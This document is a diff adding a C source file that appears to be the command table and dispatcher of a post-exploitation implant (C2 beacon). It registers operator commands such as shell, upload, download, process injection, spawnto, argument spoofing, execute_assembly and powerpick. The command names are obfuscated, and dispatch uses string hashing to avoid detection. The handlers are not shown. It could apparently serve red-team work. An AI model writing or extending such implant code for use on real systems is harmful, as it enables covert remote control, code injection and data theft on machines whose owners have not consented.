@@ -1,0 +1,133 @@
+#include "commands.h"
+#include "config.h"
+#include "common.h"
+
+#define MAX_COMMANDS 31
+
+static COMMAND_ENTRY g_commands[MAX_COMMANDS];
+static DWORD g_command_count = 0;
+
+static VOID _register(const char* name, COMMAND_HANDLER handler) {
+    if (g_command_count >= MAX_COMMANDS) return;
+    g_commands[g_command_count].hash    = hash_string_djb2(name);
+    g_commands[g_command_count].handler = handler;
+    g_command_count++;
+}
+
+VOID register_commands(PINSTANCE inst) {
+    g_command_count = 0;
+
+#ifdef INCLUDE_CMD_SHELL
+    _register(XSTR("shell"), cmd_shell);
+#endif
+#ifdef INCLUDE_CMD_LS
+    _register(XSTR("ls"), cmd_ls);
+#endif
+#ifdef INCLUDE_CMD_CD
+    _register(XSTR("cd"), cmd_cd);
+#endif
+#ifdef INCLUDE_CMD_PWD
+    _register(XSTR("pwd"), cmd_pwd);
+#endif
+#ifdef INCLUDE_CMD_CAT
+    _register(XSTR("cat"), cmd_cat);
+#endif
+#ifdef INCLUDE_CMD_UPLOAD
+    _register(XSTR("upload"), cmd_upload);
+#endif
+#ifdef INCLUDE_CMD_DOWNLOAD
+    _register(XSTR("download"), cmd_download);
+#endif
+#ifdef INCLUDE_CMD_EXIT
+    _register(XSTR("exit"), cmd_exit);
+#endif
+#ifdef INCLUDE_CMD_SLEEP
+    _register(XSTR("sleep"), cmd_sleep);
+#endif
+#ifdef INCLUDE_CMD_WHOAMI
+    _register(XSTR("whoami"), cmd_whoami);
+#endif
+#ifdef INCLUDE_CMD_GETUID
+    _register(XSTR("getuid"), cmd_getuid);
+#endif
+#ifdef INCLUDE_CMD_PS
+    _register(XSTR("ps"), cmd_ps);
+#endif
+#ifdef INCLUDE_CMD_KILL
+    _register(XSTR("kill"), cmd_kill);
+#endif
+#ifdef INCLUDE_CMD_CP
+    _register(XSTR("cp"), cmd_cp);
+#endif
+#ifdef INCLUDE_CMD_MV
+    _register(XSTR("mv"), cmd_mv);
+#endif
+#ifdef INCLUDE_CMD_RM
+    _register(XSTR("rm"), cmd_rm);
+#endif
+#ifdef INCLUDE_CMD_MKDIR
+    _register(XSTR("mkdir"), cmd_mkdir);
+#endif
+#ifdef INCLUDE_CMD_INLINE_EXECUTE
+    _register(XSTR("inline_execute"), cmd_inline_execute);
+#endif
+#ifdef INCLUDE_CMD_INJECT
+    _register(XSTR("inject"), cmd_inject);
+#endif
+#ifdef INCLUDE_CMD_CONFIG
+    _register(XSTR("config"), cmd_config);
+#endif
+#ifdef INCLUDE_CMD_SPAWNTO_X64
+    _register(XSTR("spawnto_x64"), cmd_spawnto_x64);
+#endif
+#ifdef INCLUDE_CMD_SPAWNTO_X86
+    _register(XSTR("spawnto_x86"), cmd_spawnto_x86);
+#endif
+#ifdef INCLUDE_CMD_SPAWN
+    _register(XSTR("spawn"), cmd_spawn);
+#endif
+#ifdef INCLUDE_CMD_ARGUE
+    _register(XSTR("argue"), cmd_argue);
+#endif
+#ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY
+    _register(XSTR("execute_assembly"), cmd_execute_assembly);
+#endif
+#ifdef INCLUDE_CMD_POWERPICK
+    _register(XSTR("powerpick"), cmd_powerpick);
+#endif
+}
+
+VOID dispatch_command(PINSTANCE inst, const char* cmd_name, BYTE* args, DWORD args_len,
+                      BYTE** out_data, DWORD* out_len, BOOL* out_error) {
+    DWORD cmd_hash = hash_string_djb2(cmd_name);
+
+    for (DWORD i = 0; i < g_command_count; i++) {
+        if (g_commands[i].hash == cmd_hash) {
+            PARSER p;
+            parser_init(&p, args, args_len);
+
+            PPACKAGE pkg = package_create(inst);
+            if (!pkg) return;
+
+            g_commands[i].handler(inst, &p, pkg);
+
+            if (out_error) *out_error = pkg->is_error;
+            if (out_data && out_len && pkg->length > 0) {
+                *out_data = (BYTE*)es_malloc(inst, pkg->length);
+                if (*out_data) {
+                    es_memcpy(*out_data, pkg->buffer, pkg->length);
+                    *out_len = pkg->length;
+                }
+            } else if (out_data) {
+                *out_data = NULL;
+            }
+
+            package_destroy(inst, pkg);
+            return;
+        }
+    }
+
+    if (out_error) *out_error = TRUE;
+    if (out_data) *out_data = NULL;
+    if (out_len) *out_len = 0;
+}
